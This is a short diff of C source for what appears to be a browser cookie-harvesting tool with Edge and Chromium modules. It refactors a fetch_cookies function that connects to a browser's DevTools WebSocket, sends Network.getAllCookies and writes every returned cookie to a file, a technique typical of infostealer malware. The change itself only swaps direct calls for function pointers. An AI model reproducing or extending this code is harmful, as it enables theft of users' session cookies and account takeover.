@@ -1,5 +1,6 @@
-#include "dlls/edge/websocket.h"
 #include "shared/cookies.h"
+#include "dlls/edge/edge.h"
+#include "dlls/chromium/websocket.h"
 
 #include <windows.h>
 #include <winhttp.h>
@@ -141,7 +142,7 @@ void fetch_cookies(const char *ws_url, const FILE *outfile) {
 
     printf("Connecting to WebSocket: %s\n", ws_url);
 
-    HINTERNET ws = connect_websocket(ws_url);
+    HINTERNET ws = connect_websocket_ptr ? connect_websocket_ptr(ws_url) : NULL;
     if (!ws) {
         printf("[ERROR] WebSocket connection failed\n");
         return;
@@ -156,7 +157,7 @@ void fetch_cookies(const char *ws_url, const FILE *outfile) {
         msg_id);
 
     printf("Sending Network.getAllCookies (id=%d)\n", msg_id);
-    ws_send(ws, msg);
+    if (ws_send_ptr) ws_send_ptr(ws, msg);
 
     printf("Waiting for cookies response...\n");
     
@@ -167,7 +168,7 @@ void fetch_cookies(const char *ws_url, const FILE *outfile) {
     char *resp;
     while (1) {
         bool last_frame;
-        if (!ws_recv(ws, &resp, &last_frame)) {
+        if (!ws_recv_ptr || !ws_recv_ptr(ws, &resp, &last_frame)) {
             printf("[ERROR] ws_recv failed\n");
             break;
         }
@@ -211,7 +212,7 @@ void fetch_cookies(const char *ws_url, const FILE *outfile) {
     printf("Cookies gathered successfully\n");
     printf("Closing WebSocket\n");
 
-    close_websocket(ws);
+    if (close_websocket_ptr) close_websocket_ptr(ws);
 
     printf("WebSocket closed\n");
 }
